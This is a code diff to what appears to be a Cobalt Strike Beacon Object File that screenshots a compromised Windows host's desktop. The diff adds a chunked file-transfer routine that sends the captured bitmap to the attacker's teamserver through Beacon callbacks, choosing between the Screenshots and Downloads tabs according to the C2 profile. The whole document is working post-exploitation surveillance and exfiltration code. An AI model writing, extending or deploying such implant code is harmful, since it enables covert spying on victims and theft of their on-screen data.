@@ -6,7 +6,7 @@
 #pragma comment(lib, "Gdi32.lib")
 
 /*Download Screenshot*/
-void downloadScreenshot(unsigned char* jpg, int jpgLen, int session, char* windowTitle, int titleLen, char* username, int usernameLen) {
+void downloadScreenshot(char* jpg, int jpgLen, int session, char* windowTitle, int titleLen, char* username, int usernameLen) {
 // Function modified by @BinaryFaultline
 
 // This data helped me figure out the C code to download a screenshot. It was found in the BOF.NET code here: https://github.com/CCob/BOF.NET/blob/2da573a4a2a760b00e66cd051043aebb2cfd3182/managed/BOFNET/BeaconObject.cs
@@ -79,6 +79,137 @@ void downloadScreenshot(unsigned char* jpg, int jpgLen, int session, char* windo
     return;
 }
 
+void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize) {
+
+    //Intializes random number generator to create fileId 
+    time_t t;
+    MSVCRT$srand((unsigned)MSVCRT$time(&t));
+    int fileId = MSVCRT$rand();
+
+    //8 bytes for fileId and fileSize
+    int messageLength = downloadFileNameLength + 8;
+    char* packedData = (char*)MSVCRT$malloc(messageLength);
+
+    //pack on fileId as 4-byte int first
+    packedData[0] = (fileId >> 24) & 0xFF;
+    packedData[1] = (fileId >> 16) & 0xFF;
+    packedData[2] = (fileId >> 8) & 0xFF;
+    packedData[3] = fileId & 0xFF;
+
+    //pack on fileSize as 4-byte int second
+    packedData[4] = (fileSize >> 24) & 0xFF;
+    packedData[5] = (fileSize >> 16) & 0xFF;
+    packedData[6] = (fileSize >> 8) & 0xFF;
+    packedData[7] = fileSize & 0xFF;
+
+    int packedIndex = 8;
+
+    //pack on the file name last
+    for (int i = 0; i < downloadFileNameLength; i++) {
+        packedData[packedIndex] = fileName[i];
+        packedIndex++;
+    }
+
+    BeaconOutput(CALLBACK_FILE, packedData, messageLength);
+
+    if (fileSize > (1024 * 900)) {
+
+        //Lets see how many times this constant goes into our file size, then add one (because if it doesn't go in at all, we still have one chunk)
+        int numOfChunks = (fileSize / (1024 * 900)) + 1;
+        int index = 0;
+        int chunkSize = 1024 * 900;
+
+        while (index < fileSize) {
+            if (fileSize - index > chunkSize) {//We have plenty of room, grab the chunk and move on
+
+                /*First 4 are the fileId
+            then account for length of file
+            then a byte for the good-measure null byte to be included
+                then lastly is the 4-byte int of the fileSize*/
+                int chunkLength = 4 + chunkSize;
+                char* packedChunk = (char*)MSVCRT$malloc(chunkLength);
+
+                //pack on fileId as 4-byte int first
+                packedChunk[0] = (fileId >> 24) & 0xFF;
+                packedChunk[1] = (fileId >> 16) & 0xFF;
+                packedChunk[2] = (fileId >> 8) & 0xFF;
+                packedChunk[3] = fileId & 0xFF;
+
+                int chunkIndex = 4;
+
+                //pack on the file name last
+                for (int i = index; i < index + chunkSize; i++) {
+                    packedChunk[chunkIndex] = returnData[i];
+                    chunkIndex++;
+                }
+
+                BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
+
+            }
+            else {//This chunk is smaller than the chunkSize, so we have to be careful with our measurements
+
+                int lastChunkLength = fileSize - index + 4;
+                char* lastChunk = (char*)MSVCRT$malloc(lastChunkLength);
+
+                //pack on fileId as 4-byte int first
+                lastChunk[0] = (fileId >> 24) & 0xFF;
+                lastChunk[1] = (fileId >> 16) & 0xFF;
+                lastChunk[2] = (fileId >> 8) & 0xFF;
+                lastChunk[3] = fileId & 0xFF;
+                int lastChunkIndex = 4;
+
+                //pack on the file name last
+                for (int i = index; i < fileSize; i++) {
+                    lastChunk[lastChunkIndex] = returnData[i];
+                    lastChunkIndex++;
+                }
+                BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
+            }
+
+            index = index + chunkSize;
+
+        }
+
+    }
+    else {
+
+        /*first 4 are the fileId
+        then account for length of file
+        then a byte for the good-measure null byte to be included
+        then lastly is the 4-byte int of the fileSize*/
+        int chunkLength = 4 + fileSize;
+        char* packedChunk = (char*)MSVCRT$malloc(chunkLength);
+
+        //pack on fileId as 4-byte int first
+        packedChunk[0] = (fileId >> 24) & 0xFF;
+        packedChunk[1] = (fileId >> 16) & 0xFF;
+        packedChunk[2] = (fileId >> 8) & 0xFF;
+        packedChunk[3] = fileId & 0xFF;
+        int chunkIndex = 4;
+
+        //pack on the file name last
+        for (int i = 0; i < fileSize; i++) {
+            packedChunk[chunkIndex] = returnData[i];
+            chunkIndex++;
+        }
+
+        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
+    }
+
+
+    //We need to tell the teamserver that we are done writing to this fileId
+    char packedClose[4];
+
+    //pack on fileId as 4-byte int first
+    packedClose[0] = (fileId >> 24) & 0xFF;
+    packedClose[1] = (fileId >> 16) & 0xFF;
+    packedClose[2] = (fileId >> 8) & 0xFF;
+    packedClose[3] = fileId & 0xFF;
+    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
+
+    return;
+}
+
 #pragma region error_handling
 #define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
 BOOL _print_error(char* func, int line,  char* msg, HRESULT hr) {
@@ -93,7 +224,7 @@ BOOL _print_error(char* func, int line,  char* msg, HRESULT hr) {
 #pragma endregion
 
 
-BOOL SaveHBITMAPToFile(HBITMAP hBitmap)
+BOOL SaveHBITMAPToFile(HBITMAP hBitmap, int getOnlyProfile)
 {
     HDC hDC;
     int iBits;
@@ -118,7 +249,7 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap)
     GetObject(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
     bi.biSize = sizeof(BITMAPINFOHEADER);
     bi.biWidth = Bitmap0.bmWidth;
-    bi.biHeight = Bitmap0.bmHeight;
+    bi.biHeight = -Bitmap0.bmHeight;
     bi.biPlanes = 1;
     bi.biBitCount = wBitCount;
     bi.biCompression = BI_RGB;
@@ -163,9 +294,10 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap)
     bmfHdr.bfReserved1 = 0;
     bmfHdr.bfReserved2 = 0;
     bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
-    unsigned char* bmpdata = (unsigned char*)malloc(sizeof(BITMAPFILEHEADER) + dwDIBSize);
+    void* bmpdata = malloc(sizeof(BITMAPFILEHEADER) + dwDIBSize);
     memcpy(bmpdata, &bmfHdr, sizeof(BITMAPFILEHEADER));
-    memcpy(((unsigned char*)bmpdata) + sizeof(BITMAPFILEHEADER), lpbi, dwDIBSize);
+    memcpy(((char*)bmpdata) + sizeof(BITMAPFILEHEADER), lpbi, dwDIBSize);
+
 
     // The CALLBACK_SCREENSHOT takes sessionId, title (window title in default CS screenshot fork&run), username, so we need to populate those
     // Since the original author didn't do any window enumeration, I am not going through the effort of doing that enumeration, instead it's hardcoded
@@ -173,12 +305,24 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap)
     KERNEL32$ProcessIdToSessionId(KERNEL32$GetCurrentProcessId(), &session);
     char* user;
     user = (char*)getenv("USERNAME");
-    char title[] = "Right-click and \"Render BMP\" to view";
+    char title[] = "Right-click this and \"Render BMP\" to view";
+    char fileName[] = "ScreenshotBOF - Downloaded BMP.bmp";
     
     int userLength = MSVCRT$_snprintf(NULL,0,"%s",user);
     int titleLength = MSVCRT$_snprintf(NULL,0,"%s",title);
+    int fileNameLength = MSVCRT$_snprintf(NULL,0,"%s",fileName);
 
-    downloadScreenshot(bmpdata, sizeof(BITMAPFILEHEADER) + dwDIBSize, session,(char*)title, titleLength, (char*)user, userLength);
+
+    // If the profile is get-only (termination in post client is URI based), download it as a screenshot, otherwise, download it as a file
+
+    if (getOnlyProfile > 0){
+        BeaconPrintf(0x0, "[+] URI post profile detected. Saving bitmap screenshot to Screenshots tab. Note, this takes a little while...");
+        downloadScreenshot((char *)bmpdata, sizeof(BITMAPFILEHEADER) + dwDIBSize, session,(char*)title, titleLength, (char*)user, userLength);
+    } else {
+        BeaconPrintf(0x0, "[+] Post body profile detected. Saving bitmap screenshot to Downloads tab...");
+        downloadFile((char*)fileName, fileNameLength, (char *)bmpdata, sizeof(BITMAPFILEHEADER) + dwDIBSize);
+    }
+    //downloadScreenshot((char *)bmp_bmp, bmp_bmp_len, session,(char*)title, titleLength, (char*)user, userLength);
     //WriteFile(fh, (LPSTR)bmpdata, sizeof(BITMAPFILEHEADER)+ dwDIBSize, &dwWritten, NULL);
 
     /* clean up */
@@ -191,6 +335,9 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap)
 #ifdef BOF
 void go(char* buff, int len) {
     datap  parser;
+    int getOnlyProfile;
+    BeaconDataParse(&parser, buff, len);
+    getOnlyProfile = BeaconDataInt(&parser);
     int x1, y1, x2, y2, w, h;
     // get screen dimensions
     x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
@@ -217,9 +364,9 @@ void go(char* buff, int len) {
     CloseClipboard();
     */
     
-    BeaconPrintf(0x0, "[+] Saving bitmap screenshot to Screenshots tab...");
-    SaveHBITMAPToFile(hBitmap);
-
+    
+    SaveHBITMAPToFile(hBitmap, getOnlyProfile);
+    BeaconPrintf(0x0, "[+] Screenshot downloaded...");
     // clean up
     SelectObject(hDC, old_obj);
     DeleteDC(hDC);
